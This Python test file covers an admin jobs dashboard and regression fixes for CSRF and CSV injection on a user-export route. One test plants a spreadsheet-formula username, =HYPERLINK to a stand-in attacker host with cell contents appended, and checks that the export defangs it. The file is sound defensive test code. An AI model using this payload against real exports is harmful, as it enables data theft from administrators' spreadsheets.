"""Tests for /admin/jobs + /admin/api/jobs/refresh.

These cover:
  - non-admin callers get 403 on both the page and the JSON refresh route
  - admin callers get 200 with the stats bar + cron + recent runs rendered
  - failed runs surface ``error_message`` in the recent-runs section
  - the JSON refresh route returns the expected ``{stats, running, cron, recent}`` shape

Auth setup mirrors ``test_admin_health_monitor.py`` and ``test_log_admin.py``:
seed a real admin user + session in the SQLite DB and mark it 2FA-verified
so ``_require_admin_user`` lets it through.
"""

from __future__ import annotations

import os
import sys
import time
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from fastapi.testclient import TestClient  # noqa: E402

import db  # noqa: E402
import server  # noqa: E402


def _create_admin_session() -> str:
    email = f"jobs_admin_{os.getpid()}@test.local"
    existing = db.get_user_by_email(email)
    if existing:
        user_id = existing["id"]
    else:
        user_id = db.create_user(email, "Password1!verylong", username=f"jobs_admin_{os.getpid()}")
    db.set_user_role(user_id, 2)  # super admin
    try:
        db.set_user_2fa_method(user_id, "email_otp")
    except Exception:
        pass
    token = db.create_session(user_id)
    try:
        db.mark_session_two_fa_verified(token)
    except Exception:
        pass
    return token


def _create_regular_session() -> str:
    email = f"jobs_user_{os.getpid()}@test.local"
    existing = db.get_user_by_email(email)
    if existing:
        uid = existing["id"]
        db.set_user_role(uid, 0)
    else:
        uid = db.create_user(email, "Password1!verylong", username=f"jobs_user_{os.getpid()}")
        db.set_user_role(uid, 0)
    return db.create_session(uid)


def _insert_run(*, name: str, ok: int | None, error: str | None = None,
                started_offset: int = 0, duration_ms: int = 100,
                triggered_by: str = "schedule") -> int:
    """Insert a synthetic job_runs row. Negative ``started_offset`` puts
    the run in the past."""
    now = int(time.time())
    started = now + started_offset
    completed = None if ok is None else started + max(0, duration_ms // 1000)
    with db.conn() as c:
        cur = c.execute(
            "INSERT INTO job_runs (job_name, started_at, completed_at, "
            "duration_ms, ok, error, triggered_by) VALUES (?, ?, ?, ?, ?, ?, ?)",
            (name, started, completed, duration_ms if ok is not None else None,
             ok, error, triggered_by),
        )
        return cur.lastrowid


class AdminJobsTestCase(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        try:
            import migrations as _migrations
            _migrations.upgrade_to_head()
        except Exception:
            pass
        cls.client = TestClient(server.app)
        cls.admin_cookies = {server.COOKIE_NAME: _create_admin_session()}
        cls.user_cookies = {server.COOKIE_NAME: _create_regular_session()}

    def setUp(self):
        # Clear job_runs between tests for deterministic stats.
        with db.conn() as c:
            c.execute("DELETE FROM job_runs")

    # ── Auth ─────────────────────────────────────────────────────────

    def test_page_rejects_anon(self):
        r = self.client.get("/admin/jobs", cookies={}, follow_redirects=False)
        # Anonymous callers are redirected to /gate by _denied_response.
        self.assertIn(r.status_code, (302, 303, 403))

    def test_page_rejects_non_admin(self):
        r = self.client.get(
            "/admin/jobs",
            cookies=self.user_cookies,
            follow_redirects=False,
        )
        # Non-admin logged-in users hit the 403 page from _denied_response.
        self.assertEqual(r.status_code, 403)

    def test_refresh_api_rejects_anon(self):
        r = self.client.get("/admin/api/jobs/refresh", cookies={})
        self.assertEqual(r.status_code, 403)

    def test_refresh_api_rejects_non_admin(self):
        r = self.client.get("/admin/api/jobs/refresh", cookies=self.user_cookies)
        self.assertEqual(r.status_code, 403)

    # ── Page renders ─────────────────────────────────────────────────

    def test_page_admin_200(self):
        _insert_run(name="warmup_job", ok=1, started_offset=-60, duration_ms=250)
        r = self.client.get(
            "/admin/jobs",
            cookies=self.admin_cookies,
            follow_redirects=False,
        )
        self.assertEqual(r.status_code, 200)
        body = r.text
        # Title + stats bar
        self.assertIn("Background jobs", body)
        self.assertIn("jobs-stat", body)
        self.assertIn("Success rate", body)
        # Cron + recent sections
        self.assertIn("Currently running", body)
        self.assertIn("Cron schedule", body)
        self.assertIn("Recent runs", body)
        # Filter dropdown
        self.assertIn("jobs-filter-name", body)
        # Synthetic run surfaced
        self.assertIn("warmup_job", body)

    def test_page_renders_initial_stats(self):
        # 4 successes, 1 failure within the 24h window.
        for i in range(4):
            _insert_run(name="ok_job", ok=1, started_offset=-(60 + i),
                        duration_ms=200)
        _insert_run(name="bad_job", ok=0, error="boom",
                    started_offset=-90, duration_ms=400)

        r = self.client.get("/admin/jobs", cookies=self.admin_cookies,
                            follow_redirects=False)
        self.assertEqual(r.status_code, 200)
        body = r.text
        # success rate 4/5 = 80.0%
        self.assertIn("80.0%", body)
        # Failed counter is 1
        self.assertIn('id="jobs-stat-failed">1</div>', body)
        self.assertIn('id="jobs-stat-total">5</div>', body)

    # ── Failure surfacing ────────────────────────────────────────────

    def test_failed_run_surfaces_error_message(self):
        err = "DB connection refused on attempt 1"
        _insert_run(name="flaky_job", ok=0, error=err,
                    started_offset=-30, duration_ms=120)
        r = self.client.get("/admin/jobs", cookies=self.admin_cookies,
                            follow_redirects=False)
        self.assertEqual(r.status_code, 200)
        body = r.text
        self.assertIn("flaky_job", body)
        self.assertIn(err, body)
        # And the status pill must render the failed variant.
        self.assertIn("jobs-status--failed", body)

    def test_refresh_api_failed_run_in_recent(self):
        _insert_run(name="flaky_api_job", ok=0, error="timeout",
                    started_offset=-15, duration_ms=2000)
        r = self.client.get("/admin/api/jobs/refresh",
                            cookies=self.admin_cookies)
        self.assertEqual(r.status_code, 200)
        data = r.json()
        self.assertIn("stats", data)
        self.assertIn("running", data)
        self.assertIn("cron", data)
        self.assertIn("recent", data)

        # Find the failed run in the recent list and assert it carries the
        # error message in the new translated shape.
        matches = [r for r in data["recent"] if r["job_name"] == "flaky_api_job"]
        self.assertEqual(len(matches), 1)
        row = matches[0]
        self.assertEqual(row["status"], "failed")
        self.assertEqual(row["error_message"], "timeout")
        self.assertEqual(row["duration_ms"], 2000)

    # ── Filter by job name ───────────────────────────────────────────

    def test_refresh_api_filters_by_job_name(self):
        _insert_run(name="alpha", ok=1, started_offset=-20)
        _insert_run(name="beta", ok=1, started_offset=-10)
        r = self.client.get(
            "/admin/api/jobs/refresh?job_name=alpha",
            cookies=self.admin_cookies,
        )
        self.assertEqual(r.status_code, 200)
        names = {row["job_name"] for row in r.json()["recent"]}
        self.assertIn("alpha", names)
        self.assertNotIn("beta", names)

    # ── Currently running ────────────────────────────────────────────

    def test_running_run_appears_in_running_section(self):
        # A row with ok IS NULL AND completed_at IS NULL is "running".
        _insert_run(name="long_runner", ok=None, started_offset=-5,
                    duration_ms=0)
        r = self.client.get("/admin/api/jobs/refresh",
                            cookies=self.admin_cookies)
        self.assertEqual(r.status_code, 200)
        running_names = {r["job_name"] for r in r.json()["running"]}
        self.assertIn("long_runner", running_names)


# ── /admin/users/{user_id}/export — MED CSRF + CSV-injection fix ──────────
#
# Regression coverage for the two findings closed in this commit:
#   1. GET → 405. The route was GET and silently exfil'd PII via
#      <img src="/admin/users/N/export"> when a super-admin had an authed
#      session in the same browser. POST + CSRF closes that window.
#   2. CSV cells starting with =/+/-/@/\t/\r get a leading single quote
#      so spreadsheets render them as text rather than formulas. The
#      attacker-controlled username is the realistic payload vector.

from urllib.parse import urlencode  # noqa: E402


def _prime_csrf(client: TestClient, session_token: str) -> str:
    """Hit a GET that renders HTML so the CSRF cookie is minted."""
    client.get(
        "/admin/users",
        cookies={server.COOKIE_NAME: session_token},
        follow_redirects=False,
    )
    return client.cookies.get(server.CSRF_COOKIE_NAME) or ""


class AdminUserExportTestCase(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        try:
            import migrations as _migrations
            _migrations.upgrade_to_head()
        except Exception:
            pass
        cls.client = TestClient(server.app)
        cls.admin_token = _create_admin_session()
        cls.admin_cookies = {server.COOKIE_NAME: cls.admin_token}

    def _seed_target(self, username: str) -> int:
        """Create a target user with a controllable username (the CSV-injection
        vector). Returns the user id."""
        email = f"export_target_{username}_{os.getpid()}@test.local"
        existing = db.get_user_by_email(email)
        if existing:
            uid = int(existing["id"])
        else:
            uid = db.create_user(email, "Password1!verylong", username=username)
        return uid

    # ── 1. GET is no longer accepted ─────────────────────────────────

    def test_get_export_is_rejected(self):
        """The route used to be GET — the new POST-only registration must
        return 405 (Method Not Allowed) on GET. A 404 would also indicate
        the GET surface is gone; either passes the regression."""
        uid = self._seed_target("plain_user")
        r = self.client.get(
            f"/admin/users/{uid}/export",
            cookies=self.admin_cookies,
            follow_redirects=False,
        )
        self.assertIn(r.status_code, (404, 405))

    # ── 2. POST with valid CSRF returns CSV ──────────────────────────

    def test_post_export_with_csrf_returns_csv(self):
        uid = self._seed_target("normaluser")
        csrf = _prime_csrf(self.client, self.admin_token)
        self.assertTrue(csrf, "CSRF cookie must be set after priming")

        body = urlencode([(server.CSRF_FORM_FIELD, csrf)])
        r = self.client.post(
            f"/admin/users/{uid}/export",
            data=body,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            cookies={
                server.COOKIE_NAME: self.admin_token,
                server.CSRF_COOKIE_NAME: csrf,
            },
            follow_redirects=False,
        )
        self.assertEqual(r.status_code, 200)
        self.assertIn("text/csv", r.headers.get("content-type", ""))
        # CSV header + the username we just seeded should be in the body.
        self.assertIn("field,value", r.text)
        self.assertIn("normaluser", r.text)

    def test_post_export_without_csrf_is_rejected(self):
        uid = self._seed_target("no_csrf_user")
        r = self.client.post(
            f"/admin/users/{uid}/export",
            cookies=self.admin_cookies,
            follow_redirects=False,
        )
        self.assertEqual(r.status_code, 403)

    # ── 3. CSV-injection defang ──────────────────────────────────────

    def test_csv_cell_starting_with_equals_is_prefixed(self):
        """The realistic payload: a malicious user signs up with a
        HYPERLINK-laced username, then an admin exports their data.
        We expect the cell to be written as ``'=HYPERLINK(...)`` so the
        spreadsheet renders it as text, not a formula."""
        evil = '=HYPERLINK("http://atk/?c="&A1,"x")'
        uid = self._seed_target("csvevil")
        # Patch the username directly — create_user normalises some chars.
        with db.conn() as c:
            c.execute("UPDATE users SET username = ? WHERE id = ?", (evil, uid))

        csrf = _prime_csrf(self.client, self.admin_token)
        body = urlencode([(server.CSRF_FORM_FIELD, csrf)])
        r = self.client.post(
            f"/admin/users/{uid}/export",
            data=body,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            cookies={
                server.COOKIE_NAME: self.admin_token,
                server.CSRF_COOKIE_NAME: csrf,
            },
            follow_redirects=False,
        )
        self.assertEqual(r.status_code, 200)
        text = r.text
        # The defanged form must appear; the raw `=HYPERLINK` (no leading
        # quote) must not.
        self.assertIn("'=HYPERLINK", text)
        # csv.writer quotes any cell containing `=` because the cell
        # also contains a `"`. The check above (`'=HYPERLINK` substring)
        # holds regardless of the surrounding double-quote escaping.

    def test_csv_cell_safe_unicode_pass_through(self):
        """Non-dangerous cells (regular email, plain username) must not
        gain a stray leading quote — only the unsafe prefix set is
        rewritten."""
        uid = self._seed_target("benign42")
        csrf = _prime_csrf(self.client, self.admin_token)
        body = urlencode([(server.CSRF_FORM_FIELD, csrf)])
        r = self.client.post(
            f"/admin/users/{uid}/export",
            data=body,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            cookies={
                server.COOKIE_NAME: self.admin_token,
                server.CSRF_COOKIE_NAME: csrf,
            },
            follow_redirects=False,
        )
        self.assertEqual(r.status_code, 200)
        # No leading `'` on the username row — the value is benign.
        self.assertNotIn("'benign42", r.text)
        self.assertIn("benign42", r.text)


if __name__ == "__main__":
    unittest.main()
